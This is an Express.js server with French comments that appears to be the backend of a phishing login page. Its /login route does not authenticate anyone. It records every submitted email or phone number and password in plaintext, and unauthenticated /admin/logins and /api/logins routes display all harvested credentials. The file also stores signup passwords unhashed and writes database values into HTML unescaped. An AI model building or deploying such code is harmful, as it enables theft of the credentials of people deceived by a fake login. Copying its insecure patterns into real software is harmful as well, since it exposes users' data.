const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg'); // PostgreSQL
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connexion PostgreSQL via Pool
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
});

// TEST CONNEXION DB
(async () => {
  try {
    const client = await pool.connect();
    console.log("✅ Connexion à PostgreSQL réussie !");
    const res = await client.query('SELECT NOW()');
    console.log("Date/heure actuelle dans la DB :", res.rows[0]);
    client.release();
  } catch (err) {
    console.error("❌ Impossible de se connecter à PostgreSQL :", err.message);
  }
})();

// Fonction pour exécuter des requêtes avec retry
async function runWithRetry(query, params, retries = 5) {
  try {
    return await pool.query(query, params);
  } catch (err) {
    if (retries > 0) {
      console.log(`Database error, retrying... (${retries} left)`);
      await new Promise(res => setTimeout(res, 50));
      return runWithRetry(query, params, retries - 1);
    } else {
      throw err;
    }
  }
}

// Création des tables si elles n'existent pas
(async () => {
  try {
    await runWithRetry(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        full_name TEXT NOT NULL,
        email TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL,
        date_of_birth TEXT NOT NULL,
        gender TEXT NOT NULL
      );
    `);

    await runWithRetry(`
      CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        emailOrPhone TEXT,
        password TEXT,
        login_time TIMESTAMP
      );
    `);

    console.log("✅ Tables vérifiées/créées avec succès !");
  } catch (err) {
    console.error("❌ Erreur création tables :", err.message);
  }
})();

// Route signup
app.post('/signup', async (req, res) => {
  const { full_name, email, password, date_of_birth, gender } = req.body;
  const sql = `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES ($1, $2, $3, $4, $5)`;
  const params = [full_name, email, password, date_of_birth, gender];

  try {
    await runWithRetry(sql, params);
    res.redirect('/index.html');
  } catch (err) {
    res.status(400).send('Erreur création utilisateur : ' + err.message);
  }
});

// Route login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body;
  const now = new Date();
  const sql = `INSERT INTO logins (emailOrPhone, password, login_time) VALUES ($1, $2, $3)`;
  const params = [emailOrPhone, password, now];

  try {
    await runWithRetry(sql, params);
    res.redirect('/home');
  } catch (err) {
    console.error("Erreur insertion login:", err.message);
    res.status(500).send('Erreur base de données');
  }
});

// Route home
app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

// Route admin pour voir tous les logins
app.get('/admin/logins', async (req, res) => {
  try {
    const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
    let html = `
    <html>
    <head>
        <title>Liste des logins</title>
        <link rel="stylesheet" href="/css/admin.css">
    </head>
    <body>
    <h1>Liste des logins</h1>
    <table>
    <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
    
    result.rows.forEach(row => {
      html += `<tr>
        <td>${row.id}</td>
        <td>${row.emailorphone}</td>
        <td>${row.password}</td>
        <td>${row.login_time}</td>
      </tr>`;
    });

    html += `</table></body></html>`;
    res.send(html);
  } catch (err) {
    console.error("Erreur récupération logins:", err.message);
    res.status(500).send("Erreur base de données");
  }
});

// API pour récupérer tous les logins
app.get('/api/logins', async (req, res) => {
  try {
    const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
    res.json(result.rows);
  } catch (err) {
    console.error('Erreur récupération logins:', err.message);
    res.status(500).json({ error: 'Erreur base de données' });
  }
});

// Démarrage serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur démarré sur le port ${PORT}`);
});
